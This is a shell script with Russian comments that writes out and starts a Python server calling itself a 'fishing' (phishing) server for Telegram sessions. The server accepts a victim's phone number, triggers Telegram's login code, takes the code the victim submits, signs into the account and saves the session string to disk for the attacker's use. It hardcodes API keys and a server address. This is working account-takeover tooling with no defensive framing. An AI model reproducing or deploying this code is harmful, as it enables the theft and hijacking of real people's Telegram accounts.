# Удаляем все старое
rm -f /root/server.py
rm -rf /root/telegram_sessions
mkdir -p /root/telegram_sessions

# Создаем server.py для РЕАЛЬНЫХ сессий
cat > /root/server.py << 'EOF'
#!/usr/bin/env python3
import asyncio
import json
import random
import string
import os
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# Устанавливаем telethon если нет
try:
    from telethon import TelegramClient, TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
    TELETHON_OK = True
except ImportError:
    print("УСТАНАВЛИВАЕМ TELETHON...")
    os.system("pip3 install telethon > /dev/null 2>&1")
    try:
        from telethon import TelegramClient, TelegramClient
        from telethon.sessions import StringSession
        from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
        TELETHON_OK = True
    except:
        TELETHON_OK = False
        print("НЕ УСТАНОВИЛСЯ, ПИШИ В ДЕМО-РЕЖИМЕ")

# ТВОИ ДАННЫЕ ТГ
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"

# Хранилище
active_sessions = {}  # session_id -> {phone, phone_code_hash, client}
PORT = 5000

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}")

async def start_tg_auth(phone):
    """НАЧИНАЕМ АВТОРИЗАЦИЮ В ТЕЛЕГЕ"""
    if not TELETHON_OK:
        return {"status": "error", "message": "Telethon not working"}
    
    try:
        # Чистим номер
        phone = ''.join([c for c in phone if c.isdigit()])
        if not phone.startswith('7') and not phone.startswith('8'):
            phone = '7' + phone
        
        # Генерим ID сессии
        session_id = ''.join(random.choices(string.digits + string.ascii_lowercase, k=16))
        
        # Создаем клиента
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        # Отправляем запрос на код
        sent_code = await client.send_code_request(phone)
        
        # Сохраняем
        active_sessions[session_id] = {
            'phone': phone,
            'phone_code_hash': sent_code.phone_code_hash,
            'client': client,
            'time': datetime.now().isoformat()
        }
        
        log(f"КОД ОТПРАВЛЕН НА {phone} (сессия: {session_id})")
        
        return {
            "status": "success",
            "session_id": session_id,
            "message": f"Code sent to {phone}"
        }
        
    except Exception as e:
        error_msg = str(e)
        log(f"ОШИБКА ТГ: {error_msg}")
        return {"status": "error", "message": error_msg}

async def verify_tg_code(session_id, code):
    """ПРОВЕРЯЕМ КОД И СОЗДАЕМ СЕССИЮ"""
    if session_id not in active_sessions:
        return {"status": "error", "message": "Invalid session"}
    
    session_data = active_sessions[session_id]
    client = session_data['client']
    phone = session_data['phone']
    
    try:
        # Пробуем войти с кодом
        await client.sign_in(
            phone=phone,
            code=code,
            phone_code_hash=session_data['phone_code_hash']
        )
        
        # ПОЛУЧАЕМ НАСТОЯЩУЮ СЕССИЮ
        session_string = await client.session.save()
        
        # Сохраняем в файл
        filename = f"/root/telegram_sessions/{phone}_{session_id}.session"
        
        with open(filename, 'w') as f:
            f.write(session_string)
        
        # Отключаемся
        await client.disconnect()
        
        # Удаляем из активных
        del active_sessions[session_id]
        
        log(f"✅ СЕССИЯ СОЗДАНА: {filename}")
        log(f"✅ СЕССИЯ ДЛЯ АККА {phone} ГОТОВА К ИСПОЛЬЗОВАНИЮ")
        
        return {
            "status": "success",
            "message": "Session created!",
            "session_file": filename,
            "phone": phone,
            "session_preview": session_string[:100] + "..."
        }
        
    except PhoneCodeInvalidError:
        return {"status": "error", "message": "Invalid code"}
    except PhoneCodeExpiredError:
        return {"status": "error", "message": "Code expired"}
    except SessionPasswordNeededError:
        return {"status": "error", "message": "2FA password needed"}
    except Exception as e:
        log(f"ОШИБКА ВХОДА: {str(e)}")
        return {"status": "error", "message": str(e)}

# HTTP СЕРВЕР
class FishingHandler(BaseHTTPRequestHandler):
    
    def _send_json(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
    
    def do_OPTIONS(self):
        self._send_json({})
    
    def do_GET(self):
        if self.path == '/status':
            self._send_json({
                "status": "online",
                "fishing": "active",
                "sessions_waiting": len(active_sessions),
                "telethon": TELETHON_OK,
                "time": datetime.now().isoformat()
            })
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        # Читаем запрос
        length = int(self.headers['Content-Length'])
        body = self.rfile.read(length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        # Создаем event loop для async
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        if self.path == '/auth/start':
            phone = data.get('phone', '')
            
            if not phone:
                self._send_json({"status": "error", "message": "No phone"})
            else:
                result = loop.run_until_complete(start_tg_auth(phone))
                self._send_json(result)
        
        elif self.path == '/auth/code':
            session_id = data.get('session_id', '')
            code = data.get('code', '').strip()
            
            if not session_id or not code:
                self._send_json({"status": "error", "message": "Missing data"})
            else:
                result = loop.run_until_complete(verify_tg_code(session_id, code))
                self._send_json(result)
        
        else:
            self._send_json({"status": "error", "message": "Not found"})
        
        loop.close()
    
    def log_message(self, format, *args):
        pass

# ЗАПУСК
print("🔥" * 60)
print("🔥 FISHING SERVER FOR TELEGRAM SESSIONS")
print("🔥" * 60)
print(f"🔥 PORT: {PORT}")
print(f"🔥 HOST: 188.225.11.61:{PORT}")
print(f"🔥 TELEGRAM API: {API_ID}")
print(f"🔥 TELEthon: {'✅ WORKING' if TELETHON_OK else '❌ NOT WORKING'}")
print("🔥")
print("🔥 ENDPOINTS:")
print("🔥   POST /auth/start - Send phone (gets code)")
print("🔥   POST /auth/code  - Send code (creates session)")
print("🔥   GET  /status     - Check server")
print("🔥")
print("🔥 SESSIONS SAVED TO: /root/telegram_sessions/")
print("🔥" * 60)

os.makedirs('/root/telegram_sessions', exist_ok=True)

server = HTTPServer(('0.0.0.0', PORT), FishingHandler)
server.serve_forever()
EOF

# Даем права
chmod +x /root/server.py

# Запускаем
cd /root
python3 server.py
